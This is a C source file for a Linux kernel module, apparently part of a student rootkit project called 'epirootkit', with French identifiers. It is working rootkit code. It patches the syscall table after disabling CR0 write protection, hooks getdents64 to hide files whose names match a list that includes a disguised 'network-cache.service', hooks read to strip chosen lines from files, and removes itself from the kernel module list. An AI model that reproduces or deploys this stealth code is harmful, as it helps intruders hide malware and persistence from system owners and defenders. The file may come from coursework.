#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include "dissimulation.h"

typedef asmlinkage long (*syscall_ptr_t)(const struct pt_regs *);

struct systeme_camouflage {
    unsigned long *table_appels_systeme;
    syscall_ptr_t lecture_originale;
    syscall_ptr_t listage_originale;
    int actif;
};

static struct systeme_camouflage camouflage = {0};

static const char *elements_a_dissimuler[] = {
    "fichiercache",
    "network-cache.service", 
    "network-cache.conf",
    "epirootkit",
    NULL
};

static const char *texte_a_filtrer[] = {
    "cette ligne est cache",
    NULL
};

static int verifier_nom_interdit(const char *nom_fichier)
{
    int compteur = 0;
    while (elements_a_dissimuler[compteur]) {
        if (strstr(nom_fichier, elements_a_dissimuler[compteur]))
            return 1;
        compteur++;
    }
    return 0;
}

static int verifier_ligne_interdite(const char *contenu_ligne)
{
    int position = 0;
    while (texte_a_filtrer[position]) {
        if (strstr(contenu_ligne, texte_a_filtrer[position]))
            return 1;
        position++;
    }
    return 0;
}

static asmlinkage long intercepter_lecture_repertoire(const struct pt_regs *registres)
{
    struct linux_dirent64 __user *listing_utilisateur;
    struct linux_dirent64 *tampon_noyau, *entree_courante, *entree_precedente;
    long taille_retour;
    unsigned long decalage;
    
    listing_utilisateur = (struct linux_dirent64 __user *)registres->si;
    taille_retour = camouflage.listage_originale(registres);
    
    if (taille_retour <= 0)
        return taille_retour;
    
    tampon_noyau = kmalloc(taille_retour, GFP_KERNEL);
    if (!tampon_noyau)
        return taille_retour;
    
    if (copy_from_user(tampon_noyau, listing_utilisateur, taille_retour)) {
        kfree(tampon_noyau);
        return taille_retour;
    }
    
    decalage = 0;
    entree_precedente = NULL;
    
    while (decalage < taille_retour) {
        entree_courante = (struct linux_dirent64 *)((char *)tampon_noyau + decalage);
        
        if (verifier_nom_interdit(entree_courante->d_name)) {
            if (entree_precedente) {
                entree_precedente->d_reclen += entree_courante->d_reclen;
            } else {
                taille_retour -= entree_courante->d_reclen;
                memmove(entree_courante, 
                       (char *)entree_courante + entree_courante->d_reclen,
                       taille_retour - decalage);
                continue;
            }
        } else {
            entree_precedente = entree_courante;
        }
        
        decalage += entree_courante->d_reclen;
    }
    
    copy_to_user(listing_utilisateur, tampon_noyau, taille_retour);
    kfree(tampon_noyau);
    return taille_retour;
}

static asmlinkage long intercepter_lecture_fichier(const struct pt_regs *registres)
{
    int descripteur_fichier;
    char __user *tampon_utilisateur;
    char *tampon_lecture, *tampon_filtre;
    char *debut_ligne, *fin_ligne;
    char chemin_fichier[PATH_MAX];
    char *nom_chemin;
    struct file *fichier_ouvert;
    long octets_lus;
    size_t taille_filtree;
    
    descripteur_fichier = (int)registres->di;
    tampon_utilisateur = (char __user *)registres->si;
    
    octets_lus = camouflage.lecture_originale(registres);
    if (octets_lus <= 0)
        return octets_lus;
    
    fichier_ouvert = fget(descripteur_fichier);
    if (!fichier_ouvert)
        return octets_lus;
    
    nom_chemin = d_path(&fichier_ouvert->f_path, chemin_fichier, PATH_MAX);
    fput(fichier_ouvert);
    
    if (IS_ERR(nom_chemin) || !strstr(nom_chemin, "lignescache"))
        return octets_lus;
    
    tampon_lecture = kzalloc(octets_lus + 1, GFP_KERNEL);
    if (!tampon_lecture)
        return octets_lus;
    
    if (copy_from_user(tampon_lecture, tampon_utilisateur, octets_lus)) {
        kfree(tampon_lecture);
        return octets_lus;
    }
    
    tampon_filtre = kzalloc(octets_lus + 1, GFP_KERNEL);
    if (!tampon_filtre) {
        kfree(tampon_lecture);
        return octets_lus;
    }
    
    taille_filtree = 0;
    debut_ligne = tampon_lecture;
    
    while (debut_ligne < tampon_lecture + octets_lus) {
        fin_ligne = strchr(debut_ligne, '\n');
        if (!fin_ligne)
            fin_ligne = tampon_lecture + octets_lus;
        
        if (!verifier_ligne_interdite(debut_ligne)) {
            size_t longueur = fin_ligne - debut_ligne;
            if (fin_ligne < tampon_lecture + octets_lus)
                longueur++;
            
            if (taille_filtree + longueur <= octets_lus) {
                memcpy(tampon_filtre + taille_filtree, debut_ligne, longueur);
                taille_filtree += longueur;
            }
        }
        
        debut_ligne = fin_ligne + 1;
    }
    
    if (copy_to_user(tampon_utilisateur, tampon_filtre, taille_filtree))
        octets_lus = -EFAULT;
    else
        octets_lus = taille_filtree;
    
    kfree(tampon_lecture);
    kfree(tampon_filtre);
    return octets_lus;
}

static unsigned long *localiser_table_appels(void)
{
    unsigned long *table_trouvee;
    
    table_trouvee = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!table_trouvee) {
        pr_err("epirootkit: Echec localisation table syscalls\n");
        return NULL;
    }
    
    pr_info("epirootkit: Table syscalls localisee\n");
    return table_trouvee;
}

static void modifier_protection_memoire(int desactiver)
{
    unsigned long registre_controle;
    
    asm volatile("mov %%cr0, %0" : "=r" (registre_controle));
    
    if (desactiver) {
        registre_controle &= ~0x00010000;
    } else {
        registre_controle |= 0x00010000;
    }
    
    asm volatile("mov %0, %%cr0" : : "r" (registre_controle));
}

void cacher_module(void)
{
    pr_info("epirootkit: Masquage module en cours\n");
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    pr_info("epirootkit: Module masque avec succes\n");
}

int activer_dissimulation(void)
{
    pr_info("epirootkit: Activation systeme dissimulation\n");
    
    camouflage.table_appels_systeme = localiser_table_appels();
    if (!camouflage.table_appels_systeme) {
        pr_err("epirootkit: Impossible d'activer la dissimulation\n");
        return -1;
    }
    
    camouflage.listage_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_getdents64];
    camouflage.lecture_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_read];
    
    modifier_protection_memoire(1);
    
    camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)intercepter_lecture_repertoire;
    camouflage.table_appels_systeme[__NR_read] = (unsigned long)intercepter_lecture_fichier;
    
    modifier_protection_memoire(0);
    
    camouflage.actif = 1;
    pr_info("epirootkit: Dissimulation active - fichiers et lignes masques\n");
    
    return 0;
}

void desactiver_dissimulation(void)
{
    if (!camouflage.actif || !camouflage.table_appels_systeme)
        return;
    
    pr_info("epirootkit: Desactivation systeme dissimulation\n");
    
    modifier_protection_memoire(1);
    
    camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)camouflage.listage_originale;
    camouflage.table_appels_systeme[__NR_read] = (unsigned long)camouflage.lecture_originale;
    
    modifier_protection_memoire(0);
    
    camouflage.actif = 0;
    pr_info("epirootkit: Dissimulation desactivee\n");
}